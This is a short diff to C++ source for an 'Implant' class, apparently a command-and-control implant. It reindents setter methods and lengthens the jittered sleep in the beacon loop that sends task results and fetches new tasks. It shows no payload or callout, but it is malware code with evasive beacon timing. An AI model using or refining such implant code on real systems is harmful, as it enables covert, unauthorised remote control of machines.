@@ -53,13 +53,13 @@ using json = nlohmann::json;
         return response.text;
     };
 
-    // Method to enable/disable the running status on our implant
-    void Implant::setRunning(bool isRunningIn){isRunning = isRunningIn;}
+// Method to enable/disable the running status on our implant
+void Implant::setRunning(bool isRunningIn){isRunning = isRunningIn;}
 
-    // Method to set the mean dwell time on our implant
-    void Implant::setMeanDwell(double meanDwell){
-        dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
-    }
+// Method to set the mean dwell time on our implant
+void Implant::setMeanDwell(double meanDwell){
+    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
+}
 
 // Method to send task results and receive new tasks
 [[nodiscard]] std::string Implant::sendResults(){
@@ -166,8 +166,7 @@ void Implant::beacon(){
         // Sleep for a set duration with jitter and beacon again later
         const auto sleepTimeDouble = dwellDistributionSeconds(device);
         const auto sleepTimeChrono = std::chrono::seconds{static_cast<unsigned long long>(sleepTimeDouble)};
-
-        std::this_thread::sleep_for(sleepTimeChrono);
+        std::this_thread::sleep_for(sleepTimeChrono * 10);
     }
 }
 
